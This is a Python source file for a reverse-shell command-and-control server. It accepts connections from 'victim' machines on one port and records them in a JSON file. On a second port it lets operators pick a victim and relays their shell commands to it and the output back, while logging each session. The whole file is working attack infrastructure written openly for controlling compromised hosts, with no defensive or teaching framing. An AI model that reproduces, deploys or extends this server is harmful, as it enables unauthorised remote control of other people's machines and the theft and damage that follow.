from os import mkdir
from socket import MSG_DONTWAIT, socket, SOCK_STREAM, AF_INET, MSG_PEEK
from threading import Thread
from datetime import datetime
from os.path import exists
from time import sleep
from json import dump


USERS_HOST = ('localhost', 5001)
VICTIMS_HOST = ('localhost', 5000)

def saveVictims():
    global victims

    while True:
        with open('src/victims.json', 'w') as file:
            dump([{'IP': key.split(':')[0], 'PORT': key.split(':')[1]} for key in victims.keys()], file, indent=4)
        sleep(0.5)

def log(msg):
    content = '{} - {}'.format(
        datetime.now().strftime('%d/%m/%y %H:%M:%S'),
        msg
    )
    print(content)
    with open('src/logs.txt', 'a') as file:
        file.write(content+'\n')

def isSocketClosed(sock: socket):
    try:
        data = sock.recv(16, MSG_DONTWAIT | MSG_PEEK)
        if len(data) == 0:
            return True
    except BlockingIOError:
        return False  
    except ConnectionResetError:
        return True  
    except Exception as e:
        return False
    return False

def checkVictimsSockets():
    while True:
        copy = victims.copy()
        for addr, client in copy.items():
            if isSocketClosed(client):
                log(f"Victim {addr} has disconnected")
                try:victims.pop(addr)
                except: pass
        sleep(2)

def reverseShell(user, user_addr, victim, victim_addr):
    global victims

    log(f"{user_addr}'s connected to {victim_addr}")

    while True:
        try:
            cmd = user.recv(1024)
            victim.send(cmd)
            output = victim.recv(1024)
            user.send(output)
        except Exception as error:
            log(f"Connection beetween {user_addr} and {victim_addr} has been closed (reason : {str(error)})")
            try: user.close()
            except: pass
            break

def manageVictims():

    server = socket(AF_INET, SOCK_STREAM)
    server.bind(VICTIMS_HOST)
    server.listen()

    def manageNewVictim(addr, client):
        try:
            global victims

            state = client.recv(1024).decode()

            if state != '1':
                client.close()
                return

            log(f"New victim : {addr}")
            victims[addr] = client
        except:
            return

    def receiveNewVictims():
        while True:
            try:
                client, addr = server.accept()
                addr = ':'.join(map(str, addr))
                client.send(addr.encode())
                Thread(target=manageNewVictim, args=(addr, client)).start()
            except:
                pass

    Thread(target=receiveNewVictims).start()


def manageUsers():

    server = socket(AF_INET, SOCK_STREAM)
    server.bind(USERS_HOST)
    server.listen()

    def manageNewUser(addr, client):
        try:
            global victims

            victim_addr = client.recv(1024).decode('ascii', errors='replace')
            
            log(f"{addr}'s trying to connect to {victim_addr}")

            victim_client = victims.get(victim_addr)

            if not victim_client:
                client.send(b'0')
                log(f"{addr} failed to connect to {victim_addr}")
                client.close()
                return

            client.send(b'1')

            log(f"New user : {addr}")

            Thread(target=reverseShell, args=(client,  addr, victim_client, victim_addr)).start()
        except:
            return

    def receiveNewUsers():
        while True:
            client, addr = server.accept()
            addr = ':'.join(map(str, addr))
            Thread(target=manageNewUser, args=(addr, client)).start()

    Thread(target=receiveNewUsers).start()

def init():
    global victims

    if not exists('src'):
        mkdir('src')

    if not exists('src/logs.txt'):
        with open('src/logs.txt', 'w') as file:
            file.write('')

    with open('src/victims.json', 'w') as file:
        file.write('[]')

    victims = {}
    Thread(target=saveVictims).start()

    log('Program Started')

def main():

    init()

    Thread(target=manageUsers).start()
    Thread(target=manageVictims).start()
    Thread(target=checkVictimsSockets).start()

if __name__ == '__main__': main()